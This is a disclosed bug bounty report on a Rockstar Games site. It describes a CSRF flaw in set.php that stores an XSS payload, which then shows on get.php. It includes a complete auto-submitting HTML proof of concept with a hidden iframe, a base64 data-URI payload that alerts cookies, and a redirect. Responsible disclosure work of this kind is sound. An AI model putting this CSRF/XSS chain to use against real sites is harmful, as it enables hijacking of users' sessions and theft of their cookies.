# CSRF in 'set.php' via age causes stored XSS on 'get.php' - http://www.rockstargames.com/php/videoplayer_cache/get.php'

## Report Details
- **Report ID**: 152013
- **URL**: https://hackerone.com/reports/152013
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-07-18T08:24:10.387Z
- **Disclosed**: 2017-03-10T23:15:18.247Z

## Reporter
- **Username**: nahamsec
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: rockstargames

## Vulnerability Information
Hello,

#Background:
Sending a POST request to set.php with age='PAYLOAD' will cause a stored XSS on the GET.php file (most likely caused by the cookie, since that's what the `age` is based on). For this vulnerability and in order to demonstrate BOTH CSRF and XSS I have written a simple script (tested on firefox)  that automatically sends the request to set.php and redirects you to the vulnerable file:

#POC:

````
<iframe style="display:none" name="csrf-frame" id="csrf-frame"></iframe><form method="POST" action="http://www.rockstargames.com/php/videoplayer_cache/set.php" target="csrf-frame" id="csrf-form" encType="application/x-www-form-urlencoded"><input type="text" name="age" value='<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==>CLICK ME</a>' /></form><script>document.getElementById("csrf-form").submit();</script><script>var xssframe = document.getElementById('csrf-frame');xssframe.addEventListener("load", function() { window.location='http://www.rockstargames.com/php/videoplayer_cache/get.php'; }); </script>
````

Thanks,
Ben

## Attachments
No attachments
